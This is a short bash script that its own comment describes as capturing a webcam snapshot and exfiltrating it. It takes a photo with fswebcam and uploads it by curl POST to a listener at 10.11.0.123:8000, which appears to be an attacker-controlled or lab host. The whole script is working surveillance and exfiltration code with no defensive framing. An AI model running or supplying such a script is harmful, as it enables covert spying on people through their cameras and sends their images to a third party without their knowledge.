#!/bin/bash
# Capture webcam snapshot and exfil (requires fswebcam)

IMG="shot.jpg"
DEST="http://10.11.0.123:8000/upload"

fswebcam -r 640x480 "$IMG"
curl -X POST -F "file=@$IMG" "$DEST"
